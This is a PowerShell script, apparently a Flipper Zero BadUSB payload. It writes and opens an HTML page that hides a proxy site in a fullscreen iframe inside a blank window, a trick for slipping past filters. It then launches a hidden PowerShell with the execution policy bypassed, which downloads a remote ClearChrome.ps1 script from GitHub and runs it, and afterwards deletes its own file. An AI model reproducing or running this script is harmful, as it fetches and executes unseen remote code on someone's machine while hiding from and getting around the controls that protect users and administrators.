$html = @"
<html>
  <head>
    <title>Open URL in New Window</title>
  </head>
  <body>
    <button onclick="clickHandler()">Open URL</button>
    <script>
      function clickHandler() {
        var win = window.open();
        var url = 'https://galaxybender-nebula.cyclic.app/';
        var iframe = win.document.createElement('iframe');
        iframe.style="position:fixed;width:100vw;height:100vh;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;background-color:white;border:none;";
        iframe.src = url;
        win.document.body.appendChild(iframe);
      }
    </script>
  </body>
</html>
"@

# Get the current logged in username 
$username = $env:USERNAME

# Combine the base path and file name
$filePath = Join-Path -Path "C:\Users\$username\" -ChildPath "index.html"

# 
Start-Sleep -Seconds 2

# Create the file
Set-Content -Path $filePath -Value $html

# 
Start-Sleep -Seconds 2

# 
Start-Process $filePath

# Delay for 2 seconds
Start-Sleep -Seconds 2

#
powershell -w h -NoP -Ep Bypass -Command "& { IEX (Invoke-WebRequest https://raw.githubusercontent.com/itsweekly/FlipperZero-Bad-Polar/main/Proxy/ClearChrome.ps1).Content }"

# Delay for 2 seconds
Start-Sleep -Seconds 2


# Delete the file
Remove-Item -Path $filePath
